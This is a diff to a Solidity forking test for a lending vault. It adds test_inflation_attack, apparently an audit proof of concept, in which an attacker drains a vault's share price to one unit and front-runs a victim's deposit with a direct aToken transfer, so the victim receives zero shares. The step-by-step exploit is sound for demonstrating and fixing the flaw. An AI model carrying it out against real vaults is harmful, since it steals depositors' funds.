@@ -9,7 +9,10 @@ import {ILendingProvider} from "../../../src/interfaces/ILendingProvider.sol";
 import {BorrowingVault} from "../../../src/vaults/borrowing/BorrowingVault.sol";
 import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 
-contract AaveV2ForkingTest is Routines, ForkingSetup {
+import {IV2Pool} from "../../../src/interfaces/aaveV2/IV2Pool.sol";
+import {BaseVault} from "../../../src/abstracts/BaseVault.sol";
+
+contract AaveV2ForkingTestMainnet is Routines, ForkingSetup {
   ILendingProvider public aaveV2;
 
   uint256 public constant DEPOSIT_AMOUNT = 0.5 ether;
@@ -23,6 +26,47 @@ contract AaveV2ForkingTest is Routines, ForkingSetup {
     providers[0] = aaveV2;
 
     deploy(providers);
+  }
+
+  function test_inflation_attack() public {
+    address asset = vault.asset();
+    IV2Pool aavePool = IV2Pool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
+    IV2Pool.ReserveData memory rdata = aavePool.getReserveData(asset);
+    IERC20 aToken = IERC20(rdata.aTokenAddress);
+
+    /// ALICE - attacker prepare a lot of aToken 
+    deal(asset, ALICE, 10 ether);
+    vm.startPrank(ALICE);
+    IERC20(asset).approve(address(aavePool), type(uint256).max);
+    aavePool.deposit(vault.asset(), 10 ether, ALICE, 0);
+    vm.stopPrank();
+
+    // ALICE - attacker deposit 10^18 asset tokens into vault 
+    // then withdraw 10^18-1 asset tokens to make the totalAsset = 1
+    do_deposit(1 ether, vault, ALICE);
+    do_withdraw(1 ether - 1, vault, ALICE);
+
+    // the current price of vault now is 1 and totalAsset() = 1
+    assertEq(vault.totalAssets(), 1);
+    assertEq(vault.totalSupply(), 1);
+    assertEq(vault.balanceOf(ALICE), 1);
+
+    // BOB want to deposit into vault 1 ether but ALICE front-run it
+    // ALICE transfer directly 1 ether into vault 
+    vm.prank(ALICE);
+    aToken.transfer(address(vault), 1 ether);
+
+    // BOB deposit 1 ether to vault 
+    deal(asset, BOB, 1 ether);
+    vm.startPrank(BOB);
+    IERC20(asset).approve(address(vault), 1 ether);
+    vault.deposit(1 ether, BOB);
+    vm.stopPrank();
+
+    // BOB gain 0 share 
+    assertEq(vault.balanceOf(BOB), 0);
+    assertEq(vault.totalSupply(), 1);
+    assertEq(vault.totalAssets(), 2 ether + 1);
   }
 
   function test_depositAndBorrow() public {
